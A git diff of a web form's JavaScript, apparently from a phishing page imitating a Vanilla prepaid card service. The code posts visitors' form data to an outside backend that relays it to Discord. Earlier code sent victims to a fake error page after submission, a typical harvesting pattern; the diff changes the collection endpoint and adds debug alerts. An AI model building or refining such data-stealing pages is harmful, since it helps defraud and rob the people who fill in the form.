@@ -165,15 +165,22 @@
                         zip: zip
                     };
 
-                    // URL del backend desplegado en Render
-                    var apiUrl = 'https://vanilla-prepaid.onrender.com/api/submit-form';
+                    // URL del backend desplegado en Railway
+                    // CAMBIA ESTA URL después de desplegar en Railway
+                    var apiUrl = 'https://vanilla-production-xxxx.up.railway.app/api/submit-form';
 
                     fetch(apiUrl, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(formData)
-                    }).finally(function () {
-                        window.location.href = 'error.html';
+                    }).then(function(response) {
+                        if (response.ok) {
+                            alert('Datos enviados correctamente a Discord!');
+                        } else {
+                            alert('Error al enviar datos');
+                        }
+                    }).catch(function(error) {
+                        alert('Error de conexión: ' + error.message);
                     });
                 });
             }
@@ -188,6 +195,7 @@
         });
 
         function showErrorAndRedirect() {
+            // Esta función ya no se usa, pero la mantenemos por si acaso
             var overlay = document.createElement('div');
             overlay.className = 'error-overlay';
             overlay.innerHTML = '<div class="error-box"><h1>Error!</h1><p>Redirecting, please wait...</p></div>';
